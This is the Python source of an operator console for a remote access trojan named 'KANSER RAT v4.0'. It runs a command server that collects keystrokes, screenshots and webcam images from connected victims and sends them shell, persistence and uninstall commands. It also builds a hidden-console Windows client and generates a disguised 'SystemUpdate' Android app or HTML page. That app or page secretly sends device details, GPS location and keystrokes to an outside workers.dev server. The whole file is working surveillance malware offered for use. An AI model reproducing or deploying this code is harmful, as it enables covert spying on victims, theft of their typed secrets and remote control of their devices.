#!/usr/bin/env python3
"""KANSER RAT v4.0 — Simple CLI (easy mode)"""
import os, sys, socket, threading, time, json, base64, subprocess, shutil, tempfile, random, zipfile, io
from datetime import datetime

HOST, PORT = "0.0.0.0", 4444
R, G, Y, B, M, W, X = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[95m", "\033[0m", "\033[90m"
CLIENTS, SELECTED, RUNNING = [], None, True
os.system(""); os.makedirs("captures", exist_ok=True)

def ts(): return datetime.now().strftime("%H:%M:%S")

def _server():
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT)); s.listen(50)
    while RUNNING:
        try: c, a = s.accept(); threading.Thread(target=_handle, args=(c, a), daemon=True).start()
        except: break

def _handle(conn, addr):
    global CLIENTS
    c = {"conn":conn, "ip":addr[0], "port":addr[1], "id":len(CLIENTS)+1, "info":"?", "last":time.time()}
    CLIENTS.append(c)
    print(f"\n{G}[+] #{c['id']} {c['ip']}:{c['port']} connected!{W}")
    buf = ""
    while RUNNING:
        try:
            d = conn.recv(65536).decode(errors="ignore")
            if not d: break
            buf += d
            while "\n" in buf:
                line, buf = buf.split("\n",1)
                try:
                    m = json.loads(line); t = m.get("type",""); dt = m.get("data","")
                    c["last"] = time.time()
                    if t == "sysinfo": c["info"] = str(dt)[:80]
                    elif t == "shell": print(f"\n{B}  {dt}{W}")
                    elif t == "keylog": print(f"\n{Y}[KEYS] {dt}{W}")
                    elif t in ("screen","webcam"):
                        try:
                            img = base64.b64decode(dt.split(",",1)[1] if "," in dt else dt)
                            fn = f"captures/{t}_#{c['id']}_{int(time.time())}.jpg"
                            with open(fn,"wb") as f: f.write(img)
                            print(f"\n{M}[{t.upper()}] Saved: {fn}{W}")
                        except: pass
                    else: print(f"\n{X}[{t}] {str(dt)[:100]}{W}")
                except: pass
        except: break
    conn.close(); CLIENTS.remove(c)
    print(f"\n{R}[-] #{c['id']} {c['ip']} disconnected{W}")

def _send(cid, d):
    for c in CLIENTS:
        if c["id"] == cid:
            try: c["conn"].send((json.dumps({"cmd":d["c"],"data":d.get("d","")})+"\n").encode()); return True
            except: pass
    return False

def _panel():
    global SELECTED
    while RUNNING:
        os.system("cls")
        print(f"\n{R}  KANSER RAT v4.0{W}")
        print(f"  {X}Listening on port {PORT}  |  {len(CLIENTS)} client(s) online{W}")
        print(f"  {X}{'='*55}{W}")

        if not CLIENTS:
            print(f"  {X}  No clients connected.{W}")
            print(f"  {X}  Send rat/client.py to the target to connect.{W}")
        else:
            for c in CLIENTS:
                sel = f"{G}>>{W}" if SELECTED == c["id"] else "  "
                print(f"  {sel} {Y}#{c['id']}{W}  {c['ip']}:{c['port']}  {X}{c['info'][:50]}{W}")

        print(f"  {X}{'='*55}{W}")
        print(f"  {G}1-9{W}=Select client  {G}s{W}=sysinfo  {G}sh{W}=shell  {G}ss{W}=screenshot  {G}wc{W}=webcam")
        print(f"  {G}k{W}=keylogger  {G}p{W}=persist  {G}u{W}=uninstall  {G}b{W}=build EXE  {G}a{W}=APK  {G}q{W}=quit")

        try:
            raw = input(f"\n{G}RAT>{W} ").strip()
            if not raw: continue

            if raw.isdigit():
                cid = int(raw)
                if any(c["id"] == cid for c in CLIENTS):
                    SELECTED = cid
                    _send(cid, {"c":"sysinfo"})
                    print(f"{G}  Selected #{cid}{W}"); time.sleep(0.5)
                else: print(f"{R}  No client #{cid}{W}"); time.sleep(0.5)

            elif raw == "q": break
            elif raw in ("b","a"):
                if raw == "b":
                    # Build EXE — no client needed
                    print(f"{Y}  Building EXE...{W}")
                    src = os.path.join(os.path.dirname(__file__), "client.py")
                    if os.path.exists(src):
                        try: subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], capture_output=True)
                        except: pass
                        try:
                            d = os.path.join(os.path.dirname(__file__), "dist"); os.makedirs(d, exist_ok=True)
                            subprocess.run([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--name", "KanserRAT_Client", "--distpath", d, src], check=True, timeout=120, cwd=os.path.dirname(__file__))
                            print(f"{G}  EXE built: dist/KanserRAT_Client.exe{W}")
                        except Exception as e: print(f"{R}  Build failed: {e}{W}")
                    else: print(f"{R}  client.py not found{W}")
                elif raw == "a":
                    name = input(f"{G}  App name [SystemUpdate]:{W} ").strip() or "SystemUpdate"
                    print(f"  {Y}1{W}=ZIP(AndroidStudio)  {Y}2{W}=HTML(webintoapp.com—NO SDK!)")
                    mode = input(f"{G}  Choice [2]:{W} ").strip() or "2"
                    apk_id = "apk_" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8))
                    pkg = "com." + name.lower().replace(" ","").replace("-","").replace(".","")[:8] + ".app"
                    rat_url = "https://discord-bot.kanserbusiness.workers.dev/v/" + apk_id

                    if mode == "1":
                        manifest = '<?xml version="1.0" encoding="utf-8"?>\n<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="' + pkg + '">\n'
                        for p in ["INTERNET","CAMERA","RECORD_AUDIO","ACCESS_FINE_LOCATION","ACCESS_COARSE_LOCATION","ACCESS_BACKGROUND_LOCATION","READ_EXTERNAL_STORAGE","WRITE_EXTERNAL_STORAGE","READ_CONTACTS","READ_SMS","SEND_SMS","RECEIVE_SMS","READ_CALL_LOG","READ_PHONE_STATE","BODY_SENSORS","FOREGROUND_SERVICE","RECEIVE_BOOT_COMPLETED","WAKE_LOCK","VIBRATE","REQUEST_INSTALL_PACKAGES","SYSTEM_ALERT_WINDOW","QUERY_ALL_PACKAGES"]:
                            manifest += f'  <uses-permission android:name="android.permission.{p}"/>\n'
                        manifest += '<application android:allowBackup="true" android:usesCleartextTraffic="true" android:requestLegacyExternalStorage="true">\n'
                        manifest += f'  <activity android:name=".MainActivity" android:exported="true"><intent-filter><action android:name="android.intent.action.MAIN"/><category android:name="android.intent.category.LAUNCHER"/></intent-filter></activity>\n'
                        manifest += '  <service android:name=".PersistService" android:foregroundServiceType="location|camera|microphone" android:exported="false"/>\n'
                        manifest += '  <receiver android:name=".BootReceiver" android:exported="true"><intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter></receiver>\n'
                        manifest += '</application>\n</manifest>'
                        java = 'package ' + pkg + ';\nimport android.app.*;import android.content.*;import android.os.*;import android.webkit.*;\npublic class MainActivity extends Activity{WebView w;@Override protected void onCreate(Bundle s){super.onCreate(s);w=new WebView(this);w.getSettings().setJavaScriptEnabled(true);w.setWebChromeClient(new WebChromeClient(){public void onPermissionRequest(PermissionRequest r){r.grant(r.getResources());}});w.addJavascriptInterface(new JS(this),"Android");w.loadUrl("' + rat_url + '");setContentView(w);}class JS{Context c;JS(Context x){c=x;}@android.webkit.JavascriptInterface public String info(){return Build.MODEL;}}}'
                        gradle = 'plugins { id "com.android.application" }\nandroid { compileSdk 34; namespace "' + pkg + '"; defaultConfig { applicationId "' + pkg + '"; minSdk 24; targetSdk 34; versionCode 1; versionName "1.0" } }'
                        buf = io.BytesIO()
                        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
                            z.writestr("app/src/main/AndroidManifest.xml", manifest)
                            z.writestr("app/src/main/java/" + pkg.replace(".","/") + "/MainActivity.java", java)
                            z.writestr("app/build.gradle", gradle)
                        out = os.path.join(os.path.dirname(__file__), f"kanser_apk_{name.replace(' ','_')}.zip")
                        with open(out, "wb") as f: f.write(buf.getvalue())
                        print(f"{G}  ZIP saved: {out}{W}")
                        print(f"\n{M}  *** APK ID: {apk_id} ***{W}")
                        print(f"{Y}  Write this down! Paste in web dashboard to monitor.{W}")
                        with open(os.path.join(os.path.dirname(__file__), "apk_ids.txt"), "a") as f:
                            f.write(f"{apk_id} | {name} | ZIP | {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    else:
                        html = '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no"><title>' + name + '</title><style>*{margin:0;padding:0}body{font-family:Arial;background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center}.s{width:50px;height:50px;border:3px solid #1a1a1a;border-top:3px solid #34c759;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 20px}@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}p{font-size:14px;color:#888}</style></head><body><div><div class="s"></div><p>Yukleniyor...</p></div><script>'
                        html += 'var U="' + rat_url + '";var AID="' + apk_id + '";'
                        html += 'function S(d,t){try{var x=new XMLHttpRequest();x.open("POST",U,!0);x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify({type:t,data:d,aid:AID}))}catch(e){}}'
                        html += 'S(navigator.userAgent+"|scr:"+screen.width+"x"+screen.height+"|tz:"+Intl.DateTimeFormat().resolvedOptions().timeZone+"|lang:"+navigator.language+"|cpu:"+(navigator.hardwareConcurrency||0)+"|ram:"+(navigator.deviceMemory||0),"device_info");'
                        html += 'setInterval(function(){try{navigator.geolocation.getCurrentPosition(function(p){S(p.coords.latitude+","+p.coords.longitude,"gps")})}catch(e){}},30000);'
                        html += 'setInterval(function(){S("1","heartbeat")},60000);'
                        html += 'var kb="";document.addEventListener("keydown",function(e){if(e.key.length===1)kb+=e.key;else kb+="["+e.key+"]";if(kb.length>60){S(kb,"keylog");kb=""}});'
                        html += 'setInterval(function(){if(kb){S(kb,"keylog");kb=""}},15000);'
                        html += '</script></body></html>'
                        out = os.path.join(os.path.dirname(__file__), f"kanser_apk_{name.replace(' ','_')}.html")
                        with open(out, "w", encoding="utf-8") as f: f.write(html)
                    print(f"{G}  HTML saved: {out}{W}")
                    print(f"{X}  1. Go to webintoapp.com  |  2. Upload HTML  |  3. Download APK{W}")
                    print(f"\n{M}  *** APK ID: {apk_id} ***{W}")
                    print(f"{Y}  Write this down! Paste in web dashboard to monitor.{W}")
                    # Save ID to file for reference
                    with open(os.path.join(os.path.dirname(__file__), "apk_ids.txt"), "a") as f:
                        f.write(f"{apk_id} | {name} | {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                time.sleep(1)
            elif not SELECTED: print(f"{R}Select a client first (type 1, 2...){W}"); time.sleep(1)
            elif raw == "s": _send(SELECTED, {"c":"sysinfo"})
            elif raw == "sh":
                cmd = input(f"{G}  shell cmd>{W} ").strip()
                if cmd: _send(SELECTED, {"c":"shell","d":cmd})
            elif raw == "ss": _send(SELECTED, {"c":"screenshot"})
            elif raw == "wc": _send(SELECTED, {"c":"webcam"})
            elif raw == "k": _send(SELECTED, {"c":"keylog_start"})
            elif raw == "p": _send(SELECTED, {"c":"persist"})
            elif raw == "u": _send(SELECTED, {"c":"uninstall"})
            else: print(f"{R}  Unknown: {raw}{W}"); time.sleep(0.5)

        except KeyboardInterrupt: break
        except Exception as e: print(f"{R}  Error: {e}{W}"); time.sleep(1)

if __name__ == "__main__":
    threading.Thread(target=_server, daemon=True).start()
    try: _panel()
    except KeyboardInterrupt: pass
    RUNNING = False
    print(f"\n{Y}Shutting down...{W}")
